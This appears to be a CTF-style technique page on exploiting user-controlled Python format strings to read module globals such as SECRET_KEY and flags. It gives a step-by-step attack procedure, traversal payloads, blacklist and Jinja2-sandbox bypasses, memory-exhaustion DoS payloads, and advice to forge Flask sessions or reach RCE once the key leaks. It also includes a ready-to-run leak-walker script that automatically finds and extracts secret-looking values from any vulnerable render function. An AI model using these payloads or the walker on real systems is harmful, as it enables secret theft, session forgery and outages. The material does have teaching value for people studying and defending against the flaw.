---
title: "Python Format String - str.format / f-string Attribute Traversal to Secret Leak"
category: web
subcategory: python
type: technique
tags: [format-string, str-format, format-map, f-string, python, secret-key, globals, attribute-traversal, mro, subclasses, string-formatter, vformat, percent-format, flask, information-disclosure, sandbox-escape, jinja2]
difficulty: medium
summary: "A user-controlled FORMAT STRING (not argument) lets you walk .__class__ / .__init__.__globals__ and read SECRET_KEY or any module global."
when_to_use:
  - "You see '...'.format(user_input_is_the_template) or template.format(**ctx)"
  - "Input lands in a logging call, an i18n/gettext string, or a user-editable 'message template'"
  - "You need to escape a Jinja2 SandboxedEnvironment and a .format callable is reachable"
  - "You have a leak primitive but no RCE and need SECRET_KEY / a flag out of a module global"
tools: [python3, flask-unsign, burp]
related: [ssti-jinja2, python-flask-django-attacks, deser-python-pickle, ssti-other-engines]
---

## TL;DR

`"{0.__class__}".format(obj)` evaluates attribute access *inside the format string*. If the
attacker controls the format string, they control an arbitrary attribute/item traversal over
every argument, including `__globals__`, and can read any module-level variable -- typically
`SECRET_KEY`, a flag, a DB password, or an API token. No code execution, but often the whole
challenge.

## Recognise it

The bug is **who controls the format string**, not the argument:

```python
"Hello {}".format(user)          # SAFE   - user is an argument
user.format(name=name)           # VULN   - user is the template
f"Hello {user}"                  # SAFE   - f-strings are compiled, not runtime-parsed
eval(f'f"{user}"')               # VULN   - re-compiles attacker text
"%s" % user                      # SAFE
user % {"name": name}            # VULN   - %(key)s dict traversal
string.Formatter().vformat(user, args, kw)   # VULN
"...".format_map(ctx)            # VULN when the literal is user-controlled
logging.info(user, *args)        # VULN-ish - %-style on user template
gettext(user).format(**ctx)      # VULN - translation files are often user-writable
```

Signals in a challenge:

- An error like `KeyError: 'x'`, `IndexError: Replacement index 0 out of range`,
  `AttributeError: 'Config' object has no attribute 'foo'` after you send `{0.foo}`.
- `Single '}' encountered in format string` / `Single '{' encountered` after sending `{`.
- A "custom greeting", "notification template", "invoice template" or "log format" field.
- A Jinja2 sandbox that blocks `__class__` but leaves `"".format` or `str.format_map` callable.

## Theory

`str.format` parses a mini-language (PEP 3101):

```
"{" [field_name] ["!" conversion] [":" format_spec] "}"
field_name  ::= (arg_index | arg_name) ("." attribute_name | "[" element_index "]")*
```

Key rules that define the attack surface:

- `arg_name` may be positional (`{0}`) or keyword (`{name}`).
- `.attr` performs a real `getattr`.
- `[key]` performs `__getitem__`; **the key is always a literal string** (no quotes, no nesting):
  `{0.__globals__[SECRET_KEY]}` -- note the *unquoted* `SECRET_KEY`.
- A purely numeric `[0]` is treated as an integer index.
- Nested replacement fields are only allowed inside the *format spec* (`{0:{1}}`), never inside
  the field name. So you cannot compute an attribute name at runtime.
- `!r` / `!s` / `!a` apply `repr`/`str`/`ascii` -- useful to force a readable dump of an object
  whose `__str__` is unhelpful.
- The format spec is a DoS vector: `{0:>1000000000}` allocates a gigabyte-wide string.

The canonical pivot chain:

```
{0.__class__}                                -> the type
{0.__class__.__mro__[1]}                     -> object (or a base class)
{0.__class__.__mro__[1].__subclasses__}      -> bound method (not callable from format!)
{0.__init__.__globals__}                     -> the defining module's globals dict
{0.__init__.__globals__[SECRET_KEY]}         -> the secret
{0.__init__.__globals__[__builtins__]}       -> builtins (dict inside a module)
```

**You cannot call anything.** `format` performs attribute access and subscription only, so
`__subclasses__()` is out of reach. That caps the impact at arbitrary read -- which is why the
target is always a *value*, not a callable.

Useful reachable objects when only one argument exists:

| Argument type | Pivot |
| --- | --- |
| any instance | `{0.__init__.__globals__[X]}` |
| a function | `{0.__globals__[X]}` |
| a bound method | `{0.__func__.__globals__[X]}`, `{0.__self__}` |
| a class | `{0.__init__.__globals__[X]}`, `{0.__dict__}` |
| a module | `{0.__dict__[X]}`, `{0.X}` |
| a Flask app | `{0.config[SECRET_KEY]}`, `{0.__init__.__globals__}` |
| a Flask request | `{0.application.__globals__}`, `{0.environ}` |
| an exception | `{0.__traceback__.tb_frame.f_globals[X]}`, `.f_back.f_locals` |
| a generator | `{0.gi_frame.f_locals}`, `{0.gi_frame.f_globals[X]}` |

The exception/frame route is the strongest: `tb_frame.f_back.f_back.f_locals` walks the call
stack and reads local variables of the caller, which no `__globals__` walk can reach.

## Attack

1. **Confirm** you own the template: send `{` (expect `Single '{' encountered`), then `{0}`
   (expect the first argument rendered), then `{}`.
2. **Enumerate arguments**: `{0}{1}{2}...` until `IndexError`. Try common keyword names:
   `{name}`, `{user}`, `{self}`, `{request}`, `{config}`, `{app}`, `{ctx}`, `{g}`.
3. **Type each argument**: `{0!r}`, `{0.__class__}`, `{0.__class__.__module__}`.
4. **Reach globals**: `{0.__init__.__globals__}` and read the dump -- it is a plain dict `repr`,
   so the secret is usually visible immediately with no further traversal.
5. **Targeted read** when the dump is truncated or filtered:
   `{0.__init__.__globals__[SECRET_KEY]}`, `{0.__init__.__globals__[FLAG]}`,
   `{0.__init__.__globals__[app].config[SECRET_KEY]}`.
6. **Walk the import graph** when the secret lives in another module:
   `{0.__init__.__globals__[sys].modules[app].SECRET}` -- `sys.modules[...]` is a dict, so
   the unquoted-key rule applies to the module name too.
7. **Stack walk** if an exception object is an argument:
   `{0.__traceback__.tb_frame.f_back.f_locals[password]}`.

### Percent-format variant

```python
user % {"a": 1}
```

```
%(a)s                      -> 1
%(__builtins__)s           -> KeyError unless the dict has it
```

With `%`-formatting you only get dict keys, no attribute traversal -- much weaker. The real
`%`-format danger is `logging`:

```python
logging.info(user_supplied, some_object)     # "%s" style, user controls the template
```

`%(x)s` with a non-dict raises; `%s` with a `__str__` that has side effects is the only lever.
`logging` also supports `%(asctime)s`-style LogRecord attribute access when the *format of the
handler* is attacker-controlled: `%(args)s`, `%(pathname)s`, `%(process)d`.

### Blacklist bypasses

| Blocked | Alternative |
| --- | --- |
| `__class__` | `__init__`, `__reduce__`, `__self__`, `__func__`, `__doc__.__class__` |
| `__globals__` | `__func__.__globals__`, `gi_frame.f_globals`, `__traceback__.tb_frame.f_globals` |
| `__` (double underscore) | nothing works -- every dunder path is closed; pivot to `{0.config[SECRET_KEY]}` on Flask |
| `.` (dot) | `{0[x]}` item access only; works on dicts/lists, not attributes |
| `[` `]` | `{0.attr}` only; you lose dict lookups, so dump `__globals__` wholesale |
| length limit | `{0.__init__.__globals__}` is 26 chars after `{0` -- the shortest full dump |

In a Jinja2 sandbox, the equivalent chain uses filters instead:
`{{ ""|attr("format") }}` is blocked, but `{{ "{0.__class__}"|format(obj) }}` sometimes is not,
because `format` is a *filter*, not an attribute -- worth a try when `attr` is blocked.

## Code

```python
#!/usr/bin/env python3
"""Format-string leak walker.

Given a `render(fmt) -> str` callable that formats an attacker-controlled
template against some fixed arguments, recover a named secret from the
argument's module globals.

The __main__ block builds a deliberately vulnerable app, runs the walker
against it, and asserts the secret is recovered.
"""
from __future__ import annotations

import re
from typing import Callable, Iterable

# ---------------------------------------------------------------------------
# Payload ladder
# ---------------------------------------------------------------------------

PIVOTS: tuple[str, ...] = (
    "{0.__init__.__globals__}",
    "{0.__globals__}",
    "{0.__func__.__globals__}",
    "{0.__class__.__init__.__globals__}",
    "{0.gi_frame.f_globals}",
    "{0.__traceback__.tb_frame.f_globals}",
)

TYPE_PROBES: tuple[str, ...] = (
    "{0!r}",
    "{0.__class__}",
    "{0.__class__.__name__}",
    "{0.__class__.__module__}",
    "{0.__class__.__mro__}",
)


def arg_probes(n: int = 8) -> list[str]:
    """Templates that enumerate positional arguments."""
    return ["{%d}" % i for i in range(n)]


def kw_probes(names: Iterable[str] = ()) -> list[str]:
    base = ["self", "user", "name", "request", "config", "app", "g", "ctx", "env"]
    return ["{%s}" % k for k in list(names) + base]


def read_key(pivot: str, key: str) -> str:
    """Turn a globals pivot into a targeted unquoted-key read."""
    assert pivot.endswith("}"), pivot
    return pivot[:-1] + "[" + key + "]}"


def module_hop(pivot: str, module: str, attr: str) -> str:
    """globals -> sys.modules['module'].attr, all keys unquoted."""
    return pivot[:-1] + "[sys].modules[" + module + "]." + attr + "}"


def spec_dos(width: int = 10 ** 9) -> str:
    return "{0:>%d}" % width


# ---------------------------------------------------------------------------
# The walker
# ---------------------------------------------------------------------------

_SECRETISH = re.compile(
    r"(?i)(secret|flag|token|passw|api[_-]?key|private|salt|seed|credential)")


def find_globals_pivot(render: Callable[[str], str]) -> str | None:
    """Return the first pivot template that yields a dict-looking dump."""
    for pivot in PIVOTS:
        try:
            out = render(pivot)
        except Exception:
            continue
        if out.startswith("{") and "__name__" in out:
            return pivot
    return None


def harvest_names(dump: str) -> list[str]:
    """Pull candidate global names out of a repr'd globals dict."""
    names = [n for n in re.findall(r"'([A-Za-z_][A-Za-z0-9_]*)'\s*:", dump)
             if not n.startswith("_")]
    hits = [n for n in names if _SECRETISH.search(n)]
    # keep secret-looking names first, then everything else
    return hits + [n for n in names if n not in hits]


def leak(render: Callable[[str], str], wanted: str | None = None
         ) -> tuple[str, str] | None:
    """Recover (name, value) for a secret reachable from the format arguments."""
    pivot = find_globals_pivot(render)
    if pivot is None:
        return None
    dump = render(pivot)
    for name in harvest_names(dump):
        if wanted is not None and name != wanted:
            continue
        try:
            value = render(read_key(pivot, name))
        except Exception:
            continue
        if wanted is not None or _SECRETISH.search(name):
            return name, value
    return None


# ---------------------------------------------------------------------------
# A deliberately vulnerable "app"
# ---------------------------------------------------------------------------

SECRET_KEY = "s3cr3t-deadbeef-cafe"          # module global: the target
FLAG = "flag{format_string_traversal}"
PUBLIC_MOTD = "welcome"


class Greeter:
    """Formats a user-supplied template. The classic bug."""

    def __init__(self, username: str) -> None:
        self.username = username

    def render(self, template: str) -> str:
        # VULNERABLE: the attacker owns `template`, we are just an argument.
        return template.format(self)


def _self_test() -> None:
    g = Greeter("alice")
    render = g.render

    # 1. basic reflection works
    assert "alice" in render("{0.username}")

    # 2. type probes
    assert "Greeter" in render("{0.__class__.__name__}")

    # 3. globals pivot is discovered
    pivot = find_globals_pivot(render)
    assert pivot == "{0.__init__.__globals__}", pivot

    # 4. the walker recovers a secret-looking global automatically
    found = leak(render)
    assert found is not None, "walker found nothing"
    name, value = found
    assert _SECRETISH.search(name), name

    # 5. targeted read of the real secret
    got = leak(render, wanted="SECRET_KEY")
    assert got == ("SECRET_KEY", SECRET_KEY), got
    got = leak(render, wanted="FLAG")
    assert got == ("FLAG", FLAG), got

    # 6. the raw one-liner a player would paste
    assert render("{0.__init__.__globals__[SECRET_KEY]}") == SECRET_KEY
    assert render("{0.__init__.__globals__[FLAG]}") == FLAG

    # 7. payload builders
    assert read_key("{0.__globals__}", "FLAG") == "{0.__globals__[FLAG]}"
    assert module_hop("{0.__globals__}", "os", "sep") == \
        "{0.__globals__[sys].modules[os].sep}"
    assert spec_dos(5) == "{0:>5}"
    assert len(arg_probes(3)) == 3 and arg_probes(3)[2] == "{2}"
    assert "{self}" in kw_probes()

    # 8. format_map / vformat behave identically
    import string
    vf = string.Formatter().vformat("{0.__init__.__globals__[FLAG]}", (g,), {})
    assert vf == FLAG, vf

    # 9. the safe patterns really are safe
    assert "{0.__init__.__globals__}".format is not None       # sanity
    assert "Hello {}".format("{0.__class__}") == "Hello {0.__class__}"

    print("[ok] leaked %s=%s via %s" % (name, value, pivot))
    print("[ok] all format-string self-tests passed")


if __name__ == "__main__":
    _self_test()
```

## Variants & pitfalls

- **f-strings are compiled**. `f"{user}"` is not injectable. The only f-string bugs are
  `eval(f'f"""{user}"""')` patterns and template strings stored in config/DB that get
  `eval`'d -- rare but they do appear in CTF.
- **You cannot call**. If a writeup shows `{0.__class__.__subclasses__()}` it is wrong; the
  parentheses are parsed as part of the attribute name and raise `AttributeError`.
- **Unquoted keys only**. `{0.__globals__['SECRET_KEY']}` fails with
  `KeyError: "'SECRET_KEY'"` -- the quotes become part of the key. Drop them.
- **Keys with dots or brackets are unreachable** because the mini-parser splits on them.
- **Numeric-looking keys become ints**: `{0[1]}` on a dict `{"1": x}` raises; you need a list.
- **`str.format` on a `dict` argument** gives item access without attributes:
  `{0[key]}` works, `{0.key}` does not.
- **`format_map` with a custom `__missing__`** can silently swallow probes -- test with an
  obviously invalid field like `{0.zzz}` to see whether errors surface.
- **Truncation**: a globals dump is often thousands of characters and the app may cut it.
  Use the targeted `[NAME]` read, or use `{0.__init__.__globals__.keys}` (`!r` on the bound
  method shows nothing useful -- prefer `{0.__init__.__globals__}` with a slice via `!r`).
- **Impact ceiling**: once you have `SECRET_KEY` on Flask, jump to session forging
  (`python-flask-django-attacks`) or to a pickle session (Django) for RCE.
- **DoS**: `{0:>999999999}` and `{0:.999999999f}` are instant memory exhaustion; also
  `'{0}'*N` amplification when the template is repeated.
- **Type confusion in the spec**: `{0:d}` on a string raises a distinguishable error, giving a
  cheap oracle to type an argument blindly.

## Tools

- `python3 -c "print('{0.__init__.__globals__}'.format(obj))"` for local testing.
- `flask-unsign` once `SECRET_KEY` is out, to forge session cookies.
- Burp Repeater -- the payloads are short and URL-safe except for `{}` (encode as `%7b`/`%7d`).

## References

- PEP 3101 -- Advanced String Formatting.
- Armin Ronacher -- "Be careful with Python's new-style string format" (the canonical writeup).
- CPython `string.Formatter` / `str.format` documentation, Format Specification Mini-Language.
- PayloadsAllTheThings -- Python format string section.
